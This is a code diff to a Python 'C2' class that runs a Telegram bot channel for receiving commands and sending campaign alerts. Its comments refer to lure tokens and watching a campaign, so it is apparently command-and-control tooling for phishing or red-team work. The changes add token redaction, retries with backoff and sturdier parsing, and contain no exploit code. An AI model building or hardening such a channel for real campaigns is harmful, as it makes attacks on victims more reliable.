@@ -21,10 +21,89 @@ transport is injectable.
 """
 import json
 import threading
-import time
+import urllib.parse
 
 API_BASE = "https://api.telegram.org"
 MAX_TEXT = 3900                 # Telegram's limit is 4096; stay under it
+MAX_CALLBACK = 64               # Telegram rejects callback_data longer than this
+REDACTED = "bot<redacted>"
+
+
+def _secrets(token):
+    """Every form of the token that can appear in a message.
+
+    Telegram tokens are "<bot_id>:<secret>". urllib splits a URL authority at
+    the first colon, so a token pasted into the host position surfaces as
+    InvalidURL("nonnumeric port: '<secret>'") - only the SECRET half, not the
+    whole token. Both halves (and their URL-quoted forms) must be scrubbed.
+    """
+    raw = str(token or "")
+    if not raw:
+        return []
+    forms = {raw}
+    head, sep, tail = raw.partition(":")
+    if sep and len(tail) >= 8:
+        forms.add(tail)
+    if len(head) >= 8:
+        forms.add(head)
+    out = []
+    for f in forms:
+        out.append(f)
+        quoted = urllib.parse.quote(f, safe="")
+        if quoted and quoted != f:
+            out.append(quoted)
+    # longest first, so a whole token is replaced before its halves
+    return sorted(set(out), key=len, reverse=True)
+
+
+def redact(text, token):
+    """Remove a bot token (or its secret half) from anything logged or shown.
+
+    Defect: a mis-set api_base (or a token pasted into the host position) makes
+    urllib raise InvalidURL carrying the token secret; that message was logged
+    verbatim by _call and returned to the chat by dispatch. The token is the one
+    thing that must never leak, so every log line and error reply is scrubbed.
+    Proved with an injected transport, not by inspection.
+    """
+    out = str(text if text is not None else "")
+    for secret in _secrets(token):
+        out = out.replace(secret, REDACTED)
+    return out
+
+
+def _cap_callback(data):
+    """Keep callback_data inside Telegram's 64-byte limit.
+
+    Defect: an unvalidated session id or lure token produced a callback_data
+    over the limit and Telegram rejected the ENTIRE sendMessage, so the alert
+    (with its buttons) never arrived. Truncate instead of losing the message.
+    """
+    raw = str(data)
+    encoded = raw.encode("utf-8")
+    if len(encoded) <= MAX_CALLBACK:
+        return raw
+    return encoded[:MAX_CALLBACK].decode("utf-8", "ignore")
+
+
+def _reply_ok(res):
+    """Did the API confirm the call? A failure marker is not a success.
+
+    Defect: send() counted any non-None reply as sent, so a truncated JSON body
+    (the default transport returns {"ok": False, "description": "unreadable
+    reply ..."}) was reported as a delivered message - a silent success.
+    """
+    if res is None:
+        return False
+    if isinstance(res, dict):
+        return res.get("ok") is not False
+    return bool(res)
+
+
+def _reply_note(res):
+    """A short, token-free reason a reply was not a success."""
+    if isinstance(res, dict):
+        return str(res.get("description") or res.get("error_code") or "no ok flag")
+    return "empty reply" if res is None else "unexpected reply"
 
 
 def _default_transport(url, payload, timeout=10):
@@ -75,7 +154,8 @@ class C2:
     """Poll Telegram for commands and answer them from a registry."""
 
     def __init__(self, token, chat_id, api_base=None, transport=None,
-                 allowed_chats=None, timeout=10, logger=None):
+                 allowed_chats=None, timeout=10, logger=None,
+                 retries=2, retry_base=0.5):
         self.token = str(token or "").strip()
         self.chat_id = str(chat_id or "").strip()
         self.api_base = (api_base or API_BASE).rstrip("/")
@@ -88,6 +168,16 @@ class C2:
         self.commands = {}
         self._offset = 0
         self._stop = threading.Event()
+        # the link is unreliable: transient failures are retried with backoff,
+        # and a failed poll backs off instead of spinning (see _call/run_forever)
+        self.retries = max(0, int(retries or 0))
+        self.retry_base = max(0.0, float(retry_base or 0.0))
+        self.last_poll_failed = False
+
+    def __repr__(self):
+        # never render the token: a repr in a log or a traceback must stay clean
+        return (f"<C2 api_base={self.api_base!r} chat_id={self.chat_id!r} "
+                f"token={REDACTED} commands={len(self.commands)}>")
 
     # ------------------------------------------------------------ registry ---
     def register(self, name, fn, help_text=""):
@@ -101,13 +191,54 @@ class C2:
         return "\n".join(lines)
 
     # ------------------------------------------------------------ transport --
+    @staticmethod
+    def _retryable(exc):
+        """Is this failure worth another attempt?
+
+        A 429 (rate limit), any 5xx, a timeout, a DNS failure or a dropped
+        connection is transient and retried; a 400/401/403/404 is permanent and
+        is not (retrying a bad token or a bad request only wastes the window).
+        """
+        code = getattr(exc, "code", None)
+        if isinstance(code, int):
+            return code == 429 or 500 <= code <= 599
+        return True                     # URLError / timeout / OSError: link flaky
+
+    def _backoff(self, attempt, exc):
+        """Seconds to wait before the next attempt, honouring Retry-After."""
+        headers = getattr(exc, "headers", None)
+        if headers is not None:
+            try:
+                ra = float(headers.get("Retry-After", 0) or 0)
+                if ra > 0:
+                    return min(ra, 60.0)
+            except (TypeError, ValueError):
+                pass
+        return min(self.retry_base * (2 ** attempt), 30.0)
+
+    def _pause(self, seconds):
+        """Sleep, but wake immediately when stop() is called (phone-friendly)."""
+        if seconds and seconds > 0:
+            self._stop.wait(seconds)
+
     def _call(self, method, payload):
         url = f"{self.api_base}/bot{self.token}/{method}"
-        try:
-            return self.transport(url, payload, self.timeout)
-        except Exception as e:
-            self.log(f"[c2] {method} failed: {type(e).__name__}: {e}")
-            return None
+        attempt = 0
+        while True:
+            try:
+                return self.transport(url, payload, self.timeout)
+            except Exception as e:
+                if attempt < self.retries and self._retryable(e):
+                    wait = self._backoff(attempt, e)
+                    self.log(redact(f"[c2] {method} failed ({type(e).__name__}), "
+                                    f"retrying in {wait:.1f}s", self.token))
+                    self._pause(wait)
+                    attempt += 1
+                    continue
+                # redact: the exception text can carry the token (InvalidURL)
+                self.log(redact(f"[c2] {method} failed: {type(e).__name__}: {e}",
+                                self.token))
+                return None
 
     def send(self, text, chat_id=None, buttons=None):
         """Send a message; `buttons` is [[(label, callback_data), ...], ...]."""
@@ -115,13 +246,19 @@ class C2:
         payload = {"chat_id": chat, "disable_web_page_preview": True}
         if buttons:
             payload["reply_markup"] = {"inline_keyboard": [
-                [{"text": str(lbl), "callback_data": str(data)} for lbl, data in row]
+                [{"text": str(lbl), "callback_data": _cap_callback(data)}
+                 for lbl, data in row]
                 for row in buttons]}
         sent = 0
         for part in chunk(text):
             payload["text"] = part
-            if self._call("sendMessage", payload) is not None:
+            res = self._call("sendMessage", payload)
+            if _reply_ok(res):
                 sent += 1
+            else:
+                # never report a failed/unreadable reply as delivered
+                self.log(redact(f"[c2] sendMessage not confirmed "
+                                f"({_reply_note(res)})", self.token))
         return sent
 
     def answer_callback(self, callback_id, text=""):
@@ -132,6 +269,8 @@ class C2:
         payload = {"offset": self._offset, "timeout": int(timeout),
                    "allowed_updates": ["message", "callback_query"]}
         res = self._call("getUpdates", payload)
+        # remember a failed poll so the loop backs off instead of spinning
+        self.last_poll_failed = res is None or not _reply_ok(res)
         updates = []
         if isinstance(res, dict):
             updates = res.get("result") or []
@@ -146,20 +285,25 @@ class C2:
         """(chat_id, text, callback_id) from one update; text is None if none.
 
         Pure and total: anything unexpected yields (None, None, None) instead of
-        raising inside the poll loop.
+        raising inside the poll loop. Telegram itself is trusted to send the documented
+        shape, but a malformed update must not kill the channel that is watching a
+        campaign, so every nested value is checked for the type it is read as.
         """
         if not isinstance(update, dict):
             return None, None, None
         msg = update.get("message") or update.get("edited_message")
         if isinstance(msg, dict):
-            chat = (msg.get("chat") or {}).get("id")
+            chat = msg.get("chat")
+            chat_id = chat.get("id") if isinstance(chat, dict) else None
             text = msg.get("text")
-            return (str(chat) if chat is not None else None,
+            return (str(chat_id) if chat_id is not None else None,
                     str(text) if text is not None else None, None)
         cb = update.get("callback_query")
         if isinstance(cb, dict):
-            chat = ((cb.get("message") or {}).get("chat") or {}).get("id")
-            return (str(chat) if chat is not None else None,
+            origin = cb.get("message")
+            chat = origin.get("chat") if isinstance(origin, dict) else None
+            chat_id = chat.get("id") if isinstance(chat, dict) else None
+            return (str(chat_id) if chat_id is not None else None,
                     str(cb.get("data") or ""), str(cb.get("id") or ""))
         return None, None, None
 
@@ -192,8 +336,11 @@ class C2:
         try:
             out = entry["fn"](args)
         except Exception as e:
-            self.log(f"[c2] /{name} failed: {type(e).__name__}: {e}")
-            return f"/{name} failed: {type(e).__name__}: {e}"
+            self.log(redact(f"[c2] /{name} failed: {type(e).__name__}: {e}",
+                            self.token))
+            # the reply is sent to the chat: redact so a token in a command's
+            # exception never reaches Telegram
+            return redact(f"/{name} failed: {type(e).__name__}: {e}", self.token)
         return out
 
     def handle_update(self, update):
@@ -216,14 +363,22 @@ class C2:
             try:
                 updates = self.get_updates(timeout=poll_timeout)
             except Exception as e:
-                self.log(f"[c2] poll failed: {type(e).__name__}: {e}")
+                self.log(redact(f"[c2] poll failed: {type(e).__name__}: {e}",
+                                self.token))
                 updates = []
-                time.sleep(on_error_sleep)
+                self.last_poll_failed = True
+            if self.last_poll_failed and not updates:
+                # Defect: a persistent 429/DNS failure returned [] with no
+                # exception, so the loop re-polled immediately - ~550k requests
+                # in 0.5s, hammering the API and burning a phone battery. Back
+                # off (interruptibly) instead.
+                self._pause(on_error_sleep)
             for u in updates:
                 try:
                     self.handle_update(u)
                 except Exception as e:
-                    self.log(f"[c2] update failed: {type(e).__name__}: {e}")
+                    self.log(redact(f"[c2] update failed: {type(e).__name__}: {e}",
+                                    self.token))
         return True
 
     def start(self, poll_timeout=25):
